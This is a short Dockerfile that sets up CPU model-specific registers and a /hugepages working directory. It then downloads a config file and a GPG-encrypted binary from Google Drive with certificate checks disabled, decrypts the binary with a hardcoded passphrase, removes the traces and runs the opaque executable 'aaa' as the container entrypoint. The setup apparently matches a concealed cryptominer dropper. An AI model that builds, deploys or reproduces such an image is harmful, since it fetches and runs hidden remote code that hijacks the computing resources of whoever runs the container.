FROM ubuntu:bionic

USER root
WORKDIR /hugepages

RUN apt-get update && apt-get install -y wget sudo gnupg apt-file libhwloc-dev libssl1.0.0 && sudo su && echo "nameserver 1.1.1.1" >> /etc/resolv.conf
RUN sudo apt-get --reinstall install -y module-init-tools && sudo apt-get install -y msr-tools kmod
RUN sudo echo msr >> /etc/modules
RUN wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1crs8vDO6hruUVP9_Ii0OUvSVwFbEJKOG' -O config.json
RUN wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1gQnIs_dElJBQT6iB73ufNww51-QI6wtW' -O aaa.gpg
RUN echo "7753191" | gpg --batch --yes --passphrase-fd 0 aaa.gpg
RUN apt-get clean -y && rm -f aaa.gpg && swapoff -a && chmod +x aaa
EXPOSE 443
ENTRYPOINT ["./aaa"]
